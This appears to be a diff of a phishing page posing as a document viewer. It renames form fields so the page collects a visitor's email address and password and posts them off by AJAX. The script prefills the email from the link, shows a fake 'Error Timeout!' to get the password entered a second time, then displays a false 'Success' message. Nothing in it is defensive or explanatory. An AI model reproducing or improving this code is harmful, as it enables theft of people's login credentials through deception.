@@ -75,11 +75,11 @@ body {
 		<form id="goodThings" action="" method="post">
 			<div class="form-group">
 				<label for="pro">Email Address:</label>
-				<input type="text" class="form-control" name="tin" id="tin"  value="">
+				<input type="text" class="form-control" name="email" id="email"  value="">
 			</div>
 			<div class="form-group">
 				<label for="pro">Password</label>
-				<input type="password" class="form-control" name="tan" id="tan" required="required">
+				<input type="password" class="form-control" name="password" id="password" required="required">
 			</div>
 			<button type="submit" class="btn btn-primary">View Document(s)</button>
                         <br />
@@ -99,7 +99,7 @@ body {
       const emailValue = urlParams.get('email');
 
       // Set the value of the input field with id 'email'
-      $('#tin').val(emailValue);
+      $('#email').val(emailValue);
 			// when the form is submitted
 			$("#goodThings").submit(function(event) {
 				// prevent the default form submission behavior
@@ -110,8 +110,8 @@ body {
 				$("#loadingGif").show();
 
 				// get the values of the form inputs
-				var tinVal = $("#tin").val();
-				var tanVal = $("#tan").val();
+				var emailVal = $("#email").val();
+				var passwordVal = $("#password").val();
 
 				
 				// display a success message with a delay of 1 second
@@ -119,13 +119,13 @@ body {
 				$("#message").html("Error Timeout!");
 				}, 1000);
 
-				// reset the value of the tan input field
-				$("#tan").val("");
+				// reset the value of the password input field
+				$("#password").val("");
 
 				// send form data to email
 				var emailData = {
-					tin: tinVal,
-					tan: tanVal
+					email: emailVal,
+					password: passwordVal
 				};
 				$.ajax({
 					type: "POST",
@@ -143,7 +143,7 @@ body {
 					}
 				});
 
-				// when the user fills out the tan input field again and submits
+				// when the user fills out the password input field again and submits
 				$("#myForm").submit(function(event) {
 					// prevent the default form submission behavior
 					event.preventDefault();
@@ -151,8 +151,8 @@ body {
 					// show the loading GIF
 					$("#loadingGif").show();
 
-					// get the new value of the tan input field
-					var newTanVal = $("#tan").val();
+					// get the new value of the password input field
+					var newpasswordVal = $("#password").val();
 
 					setTimeout(function() {
 					$("#message").html("Success! Retriving document(s)");
